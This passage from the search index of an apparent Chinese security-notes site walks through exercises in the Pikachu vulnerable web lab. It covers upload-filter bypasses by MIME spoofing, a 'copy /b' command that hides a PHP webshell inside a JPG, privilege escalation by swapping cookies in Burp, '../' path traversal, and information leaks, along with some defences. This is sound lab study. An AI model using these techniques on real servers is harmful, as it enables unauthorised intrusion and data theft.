\u6211\u4eec\u5728\u524d\u7aefF12\uff0c\u5c06<code>onchange=\"checkFileExt(this.value)\"</code>\u6539\u4e3a<code>onchange=\"\"</code>\uff0c\u518d\u4e0a\u4f20\u975e\u56fe\u7247\u683c\u5f0f\u6587\u4ef6\uff0c\u53d1\u73b0\u4e0a\u4f20\u6210\u529f 5. \u518d\u6216\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u5f00\u53d1\u8005\u5de5\u5177\u4e2d\u505c\u7528JaveScript\uff0c\u4e5f\u53ef\u4ee5\u8d77\u5230\u6548\u679c\u3002 </p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#8x02-mime-type","title":"8x02 MIME type","text":"<p>MIME\uff08\u591a\u7528\u9014\u4e92\u8054\u7f51\u90ae\u4ef6\u6269\u5c55\u7c7b\u578b\uff09\uff0c\u662f\u8bbe\u5b9a\u67d0\u79cd\u6269\u5c55\u540d\u7684\u6587\u4ef6\u7528\u4e00\u79cd\u5e94\u7528\u7a0b\u5e8f\u6765\u6253\u5f00\u7684\u65b9\u5f0f\u7c7b\u578b\uff0c\u5f53\u8be5\u6269\u5c55\u6587\u4ef6\u88ab\u8bbf\u95ee\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u4f7f\u7528\u6307\u5b9a\u5e94\u7528\u7a0b\u5e8f\u6765\u6253\u5f00\u3002\u591a\u7528\u4e8e\u6307\u5b9a\u4e00\u4e9b\u5ba2\u6237\u7aef\u81ea\u5b9a\u4e49\u7684\u6587\u4ef6\u540d\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5a92\u4f53\u6587\u4ef6\u6253\u5f00\u65b9\u5f0f\u3002 \u6bcf\u4e2aMIME\u7c7b\u578b\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u524d\u9762\u662f\u6570\u636e\u7684\u5927\u7c7b\u522b\uff0c\u4f8b\u5982\u58f0\u97f3audio\u3001\u56fe\u50cfimage\u7b49\uff0c\u540e\u9762\u5b9a\u4e49\u5177\u4f53\u7684\u79cd\u7c7b\uff0c\u5e38\u89c1\u7684MIME\u7c7b\u578b\uff0c\u6bd4\u5982\uff1a \u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u6587\u672c.html texthtml \u666e\u901a\u6587\u672c.txt text/plain RTF\u6587\u672c.rtf application/rtf GIF\u56fe\u5f62.gif image/gif JPEG\u56fe\u5f62.ipeg.jpg image/jpeg</p> <p>\u901a\u8fc7\u4f7f\u7528PHP\u7684\u5168\u5c40\u6570\u7ec4$ FILES ,\u4f60\u53ef\u4ee5\u4ece\u5ba2\u6237\u8ba1\u7b97\u673a\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u4f20\u6587\u4ef6\u3002 \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8868\u5355\u7684input name\uff0c\u7b2c\u4e8c\u4e2a\u4e0b\u6807\u53ef\u4ee5\u662f\"name\", \u201ctype\u201d, \u201csize\u201d, \u201ctmp name\u201d \u6216\"error\" 1. \u6211\u4eec\u5148\u5c1d\u8bd5\u53bb\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\uff0c\u53d1\u73b0\u53ef\u4ee5\u6210\u529f\u4e0a\u4f20\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u518d\u5c1d\u8bd5\u4e0a\u4f20php\u6587\u4ef6\uff0c\u53d1\u73b0\u4e0a\u4f20\u5931\u8d25\u3002  2. \u6211\u4eec\u6253\u5f00Burp\u6293\u5305\uff0c\u5148\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u770b\u4e00\u770b 3. \u6211\u4eec\u518d\u4e0a\u4f20\u4e00\u4e2aphp\u770b\u4e00\u770b 4. \u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u4e0a\u4f20php\u6587\u4ef6\u7684\u5305\u53d1\u9001\u5230repeater\uff0c\u5c06application/octet-stream\u4fee\u6539\u4e3aimage/png\u3002\u53d1\u73b0\u6210\u529f\u4e0a\u4f20\u3002 5. \u901a\u8fc7http\u5934\u7684\u4fee\u6539\u7ed5\u8fc7\u4e86MINE type\u9a8c\u8bc1\u6210\u529f\u4e71\u641e\u3002\u4e4b\u540e\u5c31\u662f\u8bbf\u95ee\u4f20\u53c2\uff0c\u901a\u8fc7\u4e00\u53e5\u8bdd\u6728\u9a6c\u63a7\u5236\u670d\u52a1\u5668\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#8x03-getimagesize","title":"8x03 getimagesize","text":"<p>getimagesize()\uff1a\u5b83\u662fphp\u63d0\u4f9b\u7684\uff0c\u901a\u8fc7\u5bf9\u76ee\u6807\u6587\u4ef6\u768416\u8fdb\u5236\u8fdb\u884c\u8bfb\u53d6\uff0c\u901a\u8fc7\u8be5\u6587\u4ef6\u7684\u524d\u9762\u51e0\u4e2a\u5b57\u7b26\u4e32\uff0c\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\u3002 getmagesize()\u8fd4\u56de\u7ed3\u679c\u4e2d\u6709\u6587\u4ef6\u5927\u5c0f\u548c\u6587\u4ef6\u7c7b\u578b\u3002 \u56fa\u5b9a\u7684\u56fe\u7247\u6587\u4ef6\uff0c\u5341\u516d\u8fdb\u5236\u7684\u5934\u90e8\u7684\u524d\u9762\u7684\u51e0\u4e2a\u5b57\u7b26\u4e32\u57fa\u672c\u4e0a\u662f\u4e00\u6837\u7684\uff0c\u6bd4\u5982\u8bf4png\u683c\u5f0f\u7684\u56fe\u7247\uff0c\u6240\u6709png\u683c\u5f0f\u7684\u56fe\u7247\u524d\u9762\u7684\u5341\u516d\u8fdb\u5236\u90fd\u662f\u4e00\u6837\u7684\u3002</p> <p>\u601d\u8def\uff1a\u6211\u4eec\u5c31\u662f\u8981\u901a\u8fc7\u4f2a\u9020\u5341\u516d\u8fdb\u5236\u7684\u5934\u90e8\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7getimagesize()\u51fd\u6570\uff0c\u4ece\u800c\u8fbe\u5230\u4e0a\u4f20\u7684\u6548\u679c\u3002</p> <p>\u56fe\u7247\u6728\u9a6c\u7684\u5236\u4f5c: \u65b9\u6cd51 :\u76f4\u63a5\u4f2a\u9020\u5934\u90e8GIF89A \u65b9\u6cd52.CMD: copy /b test.png + muma.php ccc.png \u65b9\u6cd53.\u4f7f\u7528GIMP (\u5f00\u6e90\u7684\u56fe\u7247\u4fee\u6539\u8f6f\u4ef6) , \u901a\u8fc7\u589e\u52a0\u5907\u6ce8,\u5199\u5165\u6267\u884c\u547d\u4ee4</p> <ol> <li>\u8fd9\u91cc\u6211\u4eec\u7528\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a\u6211\u4eec\u5148\u5728\u684c\u9762\u51c6\u5907\u597d1.jpg\u548c2.php\uff0c\u4e4b\u540e\u5728\u684c\u9762\u6253\u5f00cmd\u8f93\u5165<code>copy /b 1.jpg + 2.php 3.jpg</code> \u6211\u4eec\u6210\u529f\u7684\u5f97\u5230\u4e863.jpg\uff0c\u8fd9\u5f20\u56fe\u7247\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\u6d4f\u89c8\uff0c\u4f46\u5176\u5b9e\u5176\u4e2d\u5df2\u7ecf\u9690\u85cf\u4e86\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5927\u5c0f\u9a8c\u8bc1</li> <li>\u518d\u6b21\u5c1d\u8bd5\u4e0a\u4f20\uff0c\u53d1\u73b0\u6210\u529f\u4e0a\u4f20\u3002</li> </ol> <p>\u6211\u4eec\u7ed3\u5408\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u4e0a\u4f20\u56fe\u7247\u8def\u5f84\uff0c\u6ce8\u610f\u76f8\u5bf9\u8def\u5f84\u7684\u95ee\u9898\uff0c\u8981\u5728\u524d\u9762\u52a0\u4e0aunsafeupload\u3002</p> <p>\u603b\u7ed3\u9632\u8303\u63aa\u65bd\uff1a \u4e0d\u8981\u5728\u524d\u7aef\u4f7f\u7528JS\u5b9e\u65bd\u4e0a\u4f20\u9650\u5236\u7b56\u7565 \u901a\u8fc7\u670d\u52a1\u7aef\u5bf9\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u9650\u5236: 1.\u8fdb\u884c\u591a\u6761\u4ef6\u7ec4\u5408\u68c0\u67e5:\u6bd4\u5982\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u8def\u5f84\uff0c\u6269\u5c55\u540d,\u6587\u4ef6\u7c7b\u578b\uff0c\u6587\u4ef6\u5b8c\u6574\u6027 2.\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u5728\u670d\u52a1\u5668\u4e0a\u5b58\u50a8\u65f6\u8fdb\u884c\u91cd\u547d\u540d(\u5236\u5b9a\u5408\u7406\u7684\u547d\u540d\u89c4\u5219) 3.\u5bf9\u670d\u52a1\u5668\u7aef\u4e0a\u4f20\u6587\u4ef6\u7684\u76ee\u5f55\u8fdb\u884c\u6743\u9650\u63a7\u5236(\u6bd4\u5982\u53ea\u8bfb)\uff0c \u9650\u5236\u6267\u884c\u6743\u9650\u5e26\u6765\u7684\u5371\u5bb3</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#9-over-permission","title":"9  Over Permission","text":"<p>\u5982\u679c\u4f7f\u7528A\u7528\u6237\u7684\u6743\u9650\u53bb\u64cd\u4f5cB\u7528\u6237\u7684\u6570\u636e\uff0cA\u7684\u6743\u9650\u5c0f\u4e8eB\u7684\u6743\u9650\uff0c\u5982\u679c\u80fd\u591f\u6210\u529f\u64cd\u4f5c\uff0c\u5219\u79f0\u4e4b\u4e3a\u8d8a\u6743\u64cd\u4f5c\u3002 \u8d8a\u6743\u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u662f\u540e\u53f0\u4f7f\u7528\u4e86\u4e0d\u5408\u7406\u7684\u6743\u9650\u6821\u9a8c\u89c4\u5219\u5bfc\u81f4\u7684\u3002 \u4e00\u822c\u8d8a\u6743\u6f0f\u6d1e\u5bb9\u6613\u51fa\u73b0\u5728\u6743\u9650\u9875\u9762\uff08\u9700\u8981\u767b\u5f55\u7684\u9875\u9762\uff09\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u7684\u7684\u5730\u65b9\uff0c\u5f53\u7528\u6237\u5bf9\u6743\u9650\u9875\u9762\u5185\u7684\u4fe1\u606f\u8fdb\u884c\u8fd9\u4e9b\u64cd\u4f5c\u65f6\uff0c\u540e\u53f0\u9700\u8981\u5bf9\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u8fdb\u884c\u6821\u9a8c\uff0c\u770b\u5176\u662f\u5426\u5177\u5907\u64cd\u4f5c\u7684\u6743\u9650\uff0c\u4ece\u800c\u7ed9\u51fa\u54cd\u5e94\uff0c\u800c\u5982\u679c\u6821\u9a8c\u7684\u89c4\u5219\u8fc7\u4e8e\u7b80\u5355\u5219\u5bb9\u6613\u51fa\u73b0\u8d8a\u6743\u6f0f\u6d1e\u3002 \u56e0\u6b64\uff0c\u5728\u5728\u6743\u9650\u7ba1\u7406\u4e2d\u5e94\u8be5\u9075\u5b88\uff1a 1.\u4f7f\u7528\u6700\u5c0f\u6743\u9650\u539f\u5219\u5bf9\u7528\u6237\u8fdb\u884c\u8d4b\u6743; 2.\u4f7f\u7528\u5408\u7406\uff08\u4e25\u683c\uff09\u7684\u6743\u9650\u6821\u9a8c\u89c4\u5219; 3.\u4f7f\u7528\u540e\u53f0\u767b\u5f55\u6001\u4f5c\u4e3a\u6761\u4ef6\u8fdb\u884c\u6743\u9650\u5224\u65ad,\u522b\u52a8\u4e0d\u52a8\u5c31\u778e\u7528\u524d\u7aef\u4f20\u8fdb\u6765\u7684\u6761\u4ef6;</p> <p>\u5e73\u884c\u8d8a\u6743: A\u7528\u6237\u548cB\u7528\u6237\u5c5e\u4e8e\u540c\u4e00\u7ea7\u522b\u7528\u6237,\u4f46\u5404\u81ea\u4e0d\u80fd\u64cd\u4f5c\u5bf9\u65b9\u4e2a\u4eba\u4fe1\u606f, A\u7528\u6237\u5982\u679c\u8d8a\u6743\u64cd\u4f5cB\u7528\u6237\u7684\u4e2a\u4eba\u4fe1\u606f\u7684\u60c5\u51b5\u79f0\u4e3a\u5e73\u884c\u8d8a\u6743\u64cd\u4f5c \u5782\u76f4\u8d8a\u6743\u3002A\u7528\u6237\u6743\u9650\u9ad8\u4e8eB\u7528\u6237 , B\u7528\u6237\u8d8a\u6743\u64cd\u4f5cA\u7528\u6237\u7684\u6743\u9650\u7684\u60c5\u51b5\u79f0\u4e3a\u5782\u76f4\u8d8a\u6743\u3002 \u8d8a\u6743\u6f0f\u6d1e\u5c5e\u4e8e\u903b\u8f91\u6f0f\u6d1e,\u662f\u7531\u4e8e\u6743\u9650\u6821\u9a8c\u7684\u903b\u8f91\u4e0d\u591f\u4e25\u8c28\u5bfc\u81f4\u3002 \u6bcf\u4e2a\u5e94\u7528\u7cfb\u7edf\u5176\u7528\u6237\u5bf9\u5e94\u7684\u6743\u9650\u662f\u6839\u636e\u5176\u4e1a\u52a1\u529f\u80fd\u5212\u5206\u7684,\u800c\u6bcf\u4e2a\u4f01\u4e1a\u7684\u4e1a\u52a1\u53c8\u90fd\u662f\u4e0d\u4e00\u6837\u7684\u3002 \u56e0\u6b64\u8d8a\u6743\u6f0f\u6d1e\u5f88\u96be\u901a\u8fc7\u626b\u63cf\u5de5\u5177\u53d1\u73b0\u51fa\u6765,\u5f80\u5f80\u9700\u8981\u901a\u8fc7\u624b\u52a8\u8fdb\u884c\u6d4b\u8bd5\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#9x01","title":"9x01 \u6c34\u5e73\u8d8a\u6743","text":"<ul> <li>\u6211\u4eec\u5148\u6839\u636e\u63d0\u793a\u8fdb\u884c\u767b\u5f55\uff0c\u70b9\u51fb\u67e5\u770b\u4e2a\u4eba\u4fe1\u606f\u3002 </li> <li>\u901a\u8fc7Burp\u53d1\u73b0\uff0c\u5f53\u6211\u4eec\u70b9\u51fb\u6309\u94ae\u65f6\uff0c\u5411\u540e\u53f0\u63d0\u4f9b\u4e86\u4e00\u4e2aget\u8bf7\u6c42\u3002\u63d0\u4f9b\u4e86\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u540d\uff0c\u7136\u540e\u540e\u53f0\u5c06\u5176\u4fe1\u606f\u8fd4\u56de\u5230\u524d\u53f0\u3002</li> <li>\u6211\u4eec\u5c06\u8fd9\u4e2a\u6570\u636e\u5305\u53d1\u9001\u81f3Repeater\u6a21\u5757\u3002\u5e76\u4e14\u5c06\u5176\u4e2d\u7684lili\u6539\u4e3alucy\uff0c\u70b9\u51fb\u53d1\u9001\u3002</li> <li>\u53ef\u4ee5\u770b\u5230\uff0clili\u548clucy\u7684\u6743\u9650\u662f\u540c\u4e00\u7ea7\u522b\uff0c\u4f46\u662f\u6211\u4eec\u7528lili\u7684\u6743\u9650\u5f97\u5230\u4e86lucy\u7684\u4fe1\u606f\u3002</li> </ul>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#9x02","title":"9x02 \u5782\u76f4\u8d8a\u6743","text":"<ul> <li>\u70b9\u51fb\u63d0\u793a\uff0c\u201c\u8fd9\u91cc\u6709\u4e24\u4e2a\u7528\u6237admin/123456,pikachu/000000,admin\u662f\u8d85\u7ea7boss\u201d \u8bf4\u660eadmin\u662f\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u800cpikachu\u662f\u666e\u901a\u8d26\u6237\u3002 \u6211\u4eec\u5206\u522b\u767b\u5f55admin\u548cpikachu\uff0c\u53d1\u73b0admin\u6709\u6dfb\u52a0\u7528\u6237\u7b49\u6743\u9650\uff08\u7b2c\u4e00\u5f20\u4e3aadmin\uff0c\u7b2c\u4e8c\u5f20\u4e3apikachu\uff09 </li> <li>\u5148\u767b\u5f55\u8d85\u7ea7\u7ba1\u7406\u5458\uff0c\u53bb\u6267\u884c\u53ea\u6709\u7ba1\u7406\u5458\u624d\u53ef\u4ee5\u64cd\u4f5c\u7684\u65b0\u589e\u8d26\u53f7\u7684\u529f\u80fd\uff0c\u7528burp\u6293\u5305\u3002\u9000\u51fa\u767b\u5f55\u3002\u767b\u5f55\u666e\u901a\u7528\u6237\uff0c\u6267\u884c\u65b0\u589e\u8d26\u53f7\u64cd\u4f5c\u3002\u5982\u679c\u6210\u529f\uff0c\u5219\u5b58\u5728\u5782\u76f4\u8d8a\u6743\u6f0f\u6d1e\u3002</li> <li>\u767b\u5f55\u7ba1\u7406\u5458admin</li> <li>\u6dfb\u52a0\u7528\u6237\uff0c\u8fd9\u91cc\u4ee5abc\u7528\u6237\u4e3a\u4f8b</li> <li>\u7528Burp\u6293\u5305\uff0c\u5e76\u53d1\u9001\u5230Repeater\u6a21\u5757\u4e2d</li> <li>\u8fd9\u65f6\u5019\u6211\u4eec\u9000\u51fa\u767b\u5f55\uff0c\u518d\u767b\u5f55pikachu\u666e\u901a\u7528\u6237\uff0c\u5728Burp\u4e2d\u627e\u5230\u767b\u5f55\u666e\u901a\u7528\u6237\u65f6\u7684\u6570\u636e\u5305\uff0c\u5e76\u5c06\u666e\u901a\u7528\u6237\u7684cookie\u590d\u5236\uff08cookie\u5c31\u662f\u666e\u901a\u7528\u6237\u7684\u767b\u5f55\u6001\uff09\uff0c\u7c98\u8d34\u5728\u91cd\u53d1\u5668\u4e2dadmin\u8d26\u6237\u6240\u5bf9\u5e94\u7684cookie\u4f4d\u7f6e\u3002 </li> <li>\u73b0\u5728\u5c31\u76f8\u5f53\u4e8e\u4f7f\u7528\u666e\u901a\u7528\u6237\u767b\u5f55\uff0c\u7136\u540e\u5b9e\u73b0\u6dfb\u52a0\u7528\u6237\u64cd\u4f5c\uff0c\u6211\u4eec\u70b9\u51fb\u53d1\u9001\u3002\u56de\u5230\u9875\u9762\u5237\u65b0\uff0c\u6211\u4eec\u770b\u5230\u53c8\u6709\u4e00\u4e2aabc\u7528\u6237\u3002</li> <li>\u901a\u8fc7\u4e0a\u8ff0\u64cd\u4f5c\uff0c\u6211\u4eec\u6210\u529f\u7528pikachu\u666e\u901a\u6743\u9650\u6267\u884c\u4e86\u53ea\u6709admin\u7ba1\u7406\u5458\u6743\u9650\u624d\u80fd\u6267\u884c\u7684\u64cd\u4f5c\uff0c\u8bf4\u660e\u5b58\u5728\u5782\u76f4\u8d8a\u6743\u6f0f\u6d1e\u3002</li> </ul>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#10","title":"10 ../../","text":"<p>\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u6982\u8ff0 \u5728web\u529f\u80fd\u8bbe\u8ba1\u4e2d,\u5f88\u591a\u65f6\u5019\u6211\u4eec\u4f1a\u8981\u5c06\u9700\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u5b9a\u4e49\u6210\u53d8\u91cf\uff0c\u4ece\u800c\u8ba9\u524d\u7aef\u7684\u529f\u80fd\u4fbf\u7684\u66f4\u52a0\u7075\u6d3b\u3002\u5f53\u7528\u6237\u53d1\u8d77\u4e00\u4e2a\u524d\u7aef\u7684\u8bf7\u6c42\u65f6\uff0c\u4fbf\u4f1a\u5c06\u8bf7\u6c42\u7684\u8fd9\u4e2a\u6587\u4ef6\u7684\u503c(\u6bd4\u5982\u6587\u4ef6\u540d\u79f0)\u4f20\u9012\u5230\u540e\u53f0\uff0c\u540e\u53f0\u518d\u6267\u884c\u5176\u5bf9\u5e94\u7684\u6587\u4ef6\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u540e\u53f0\u6ca1\u6709\u5bf9\u524d\u7aef\u4f20\u8fdb\u6765\u7684\u503c\u8fdb\u884c\u4e25\u683c\u7684\u5b89\u5168\u8003\u8651\uff0c\u5219\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u201c../\u201d\u8fd9\u6837\u7684\u624b\u6bb5\u8ba9\u540e\u53f0\u6253\u5f00\u6216\u8005\u6267\u884c\u4e00\u4e9b\u5176\u4ed6\u7684\u6587\u4ef6\u3002\u4ece\u800c\u5bfc\u81f4\u540e\u53f0\u670d\u52a1\u5668\u4e0a\u5176\u4ed6\u76ee\u5f55\u7684\u6587\u4ef6\u7ed3\u679c\u88ab\u904d\u5386\u51fa\u6765\uff0c\u5f62\u6210\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u3002 \u770b\u5230\u8fd9\u91cc,\u4f60\u53ef\u80fd\u4f1a\u89c9\u5f97\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u548c\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u4e0b\u8f7d\uff0c\u751a\u81f3\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u6709\u5dee\u4e0d\u591a\u7684\u610f\u601d\uff0c\u662f\u7684\uff0c\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u5f62\u6210\u7684\u6700\u4e3b\u8981\u7684\u539f\u56e0\u8ddf\u8fd9\u4e24\u8005\u4e00\u6837\uff0c\u90fd\u662f\u5728\u529f\u80fd\u8bbe\u8ba1\u4e2d\u5c06\u8981\u64cd\u4f5c\u7684\u6587\u4ef6\u4f7f\u7528\u53d8\u91cf\u7684\u65b9\u5f0f\u4f20\u9012\u7ed9\u4e86\u540e\u53f0\uff0c\u800c\u53c8\u6ca1\u6709\u8fdb\u884c\u4e25\u683c\u7684\u5b89\u5168\u8003\u8651\u800c\u9020\u6210\u7684\uff0c\u53ea\u662f\u51fa\u73b0\u7684\u4f4d\u7f6e\u6240\u5c55\u73b0\u7684\u73b0\u8c61\u4e0d\u4e00\u6837\uff0c\u56e0\u6b64\uff0c\u8fd9\u91cc\u8fd8\u662f\u5355\u72ec\u62ff\u51fa\u6765\u5b9a\u4e49\u4e00\u4e0b\u3002 \u9700\u8981\u533a\u5206\u4e00\u4e0b\u7684\u662f,\u5982\u679c\u4f60\u901a\u8fc7\u4e0d\u5e26\u53c2\u6570\u7684url\uff08\u6bd4\u5982\uff1ahttp://xxxx/doc\uff09\u5217\u51fa\u4e86doc\u6587\u4ef6\u5939\u91cc\u9762\u6240\u6709\u7684\u6587\u4ef6\uff0c\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u6210\u4e3a\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u3002 \u800c\u5e76\u4e0d\u5f52\u4e3a\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u3002\uff08\u5173\u4e8e\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u4f60\u4f60\u53ef\u4ee5\u5728\"i can see you ABC\"\u4e2d\u4e86\u89e3\u66f4\u591a\uff09</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#10x01","title":"10x01 \u76ee\u5f55\u904d\u5386","text":"<ul> <li>\u6211\u4eec\u5148\u70b9\u51fb\u8d85\u94fe\u63a5 </li> <li>\u8fd9\u662f\u524d\u7aef\u5411\u540e\u53f0\u53d1\u9001\u4e86\u4e00\u4e2a\u6587\u4ef6\u540d\u3002\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u540d\u3002\u4f8b\u5982\u4fee\u6539\u6210../dir.php\u4e0a\u7ea7\u76ee\u5f55\u4e0b\u7684dir.php\uff0c\u4fbf\u53ef\u4ee5\u8bbf\u95ee\u5230\u4e0a\u4e00\u7ea7\u7684dir.php  (\u8fd9\u91cc\u5e94\u8be5\u662f\u4e24\u4e2a\u70b9)</li> </ul>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#11","title":"11 \u654f\u611f\u4fe1\u606f\u6cc4\u9732","text":"<p>\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u6982\u8ff0</p> <p>\u7531\u4e8e\u540e\u53f0\u4eba\u5458\u7684\u758f\u5ffd\u6216\u8005\u4e0d\u5f53\u7684\u8bbe\u8ba1\uff0c\u5bfc\u81f4\u4e0d\u5e94\u8be5\u88ab\u524d\u7aef\u7528\u6237\u770b\u5230\u7684\u6570\u636e\u88ab\u8f7b\u6613\u7684\u8bbf\u95ee\u5230\u3002 \u6bd4\u5982\uff1a  - \u901a\u8fc7\u8bbf\u95eeurl\u4e0b\u7684\u76ee\u5f55\uff0c\u53ef\u4ee5\u76f4\u63a5\u5217\u51fa\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5217\u8868;  - \u8f93\u5165\u9519\u8bef\u7684url\u53c2\u6570\u540e\u62a5\u9519\u4fe1\u606f\u91cc\u9762\u5305\u542b\u64cd\u4f5c\u7cfb\u7edf\u3001\u4e2d\u95f4\u4ef6\u3001\u5f00\u53d1\u8bed\u8a00\u7684\u7248\u672c\u6216\u5176\u4ed6\u4fe1\u606f;  - \u524d\u7aef\u7684\u6e90\u7801\uff08html,css,js\uff09\u91cc\u9762\u5305\u542b\u4e86\u654f\u611f\u4fe1\u606f\uff0c\u6bd4\u5982\u540e\u53f0\u767b\u5f55\u5730\u5740\u3001\u5185\u7f51\u63a5\u53e3\u4fe1\u606f\u3001\u751a\u81f3\u8d26\u53f7\u5bc6\u7801\u7b49;</p> <p>\u7c7b\u4f3c\u4ee5\u4e0a\u8fd9\u4e9b\u60c5\u51b5\uff0c\u6211\u4eec\u6210\u4e3a\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u3002\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u867d\u7136\u4e00\u76f4\u88ab\u8bc4\u4e3a\u5371\u5bb3\u6bd4\u8f83\u4f4e\u7684\u6f0f\u6d1e\uff0c\u4f46\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u5f80\u5f80\u7ed9\u653b\u51fb\u8005\u5b9e\u65bd\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u63d0\u4f9b\u5f88\u5927\u7684\u5e2e\u52a9,\u751a\u81f3\u201c\u79bb\u8c31\u201d\u7684\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u4e5f\u4f1a\u76f4\u63a5\u9020\u6210\u4e25\u91cd\u7684\u635f\u5931\u3002 \u56e0\u6b64,\u5728web\u5e94\u7528\u7684\u5f00\u53d1\u4e0a\uff0c\u9664\u4e86\u8981\u8fdb\u884c\u5b89\u5168\u7684\u4ee3\u7801\u7f16\u5199\uff0c\u4e5f\u9700\u8981\u6ce8\u610f\u5bf9\u654f\u611f\u4fe1\u606f\u7684\u5408\u7406\u5904\u7406\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#11x01-i-can-see-your-abc","title":"11x01 I can see your ABC","text":"<ol> <li>\u6211\u4eec\u5728\u9875\u9762\u4e0a\u53f3\u952e\u67e5\u770b\u7f51\u7ad9\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5728\u67d0\u4e2a\u6ce8\u91ca\u4e2d\u85cf\u6709\u6d4b\u8bd5\u8d26\u53f7 </li> <li>\u4e5f\u53ef\u4ee5\u5728\u4e0d\u767b\u9646\u72b6\u6001\u76f4\u63a5\u8bbf\u95eeabc.php\u4ece\u800c\u7ed5\u8fc7\u767b\u5f55\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#12-php","title":"12 PHP\u53cd\u5e8f\u5217\u5316","text":"<p>\u5728\u7406\u89e3\u8fd9\u4e2a\u6f0f\u6d1e\u524d,\u4f60\u9700\u8981\u5148\u641e\u6e05\u695aphp\u4e2dserialize()\uff0cunserialize()\u8fd9\u4e24\u4e2a\u51fd\u6570\u3002</p> <p>\u5e8f\u5217\u5316serialize() \u5e8f\u5217\u5316\u8bf4\u901a\u4fd7\u70b9\u5c31\u662f\u628a\u4e00\u4e2a\u5bf9\u8c61\u53d8\u6210\u53ef\u4ee5\u4f20\u8f93\u7684\u5b57\u7b26\u4e32,\u6bd4\u5982\u4e0b\u9762\u662f\u4e00\u4e2a\u5bf9\u8c61:</p> <p>PHP<pre><code>class S{\n        public $test=\"pikachu\";\n    }\n    $s=new S(); //\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\n    serialize($s); //\u628a\u8fd9\u4e2a\u5bf9\u8c61\u8fdb\u884c\u5e8f\u5217\u5316\n    \u5e8f\u5217\u5316\u540e\u5f97\u5230\u7684\u7ed3\u679c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\n        O:\u4ee3\u8868object\n        1:\u4ee3\u8868\u5bf9\u8c61\u540d\u5b57\u957f\u5ea6\u4e3a\u4e00\u4e2a\u5b57\u7b26\n        S:\u5bf9\u8c61\u7684\u540d\u79f0\n        1:\u4ee3\u8868\u5bf9\u8c61\u91cc\u9762\u6709\u4e00\u4e2a\u53d8\u91cf\n        s:\u6570\u636e\u7c7b\u578b\n    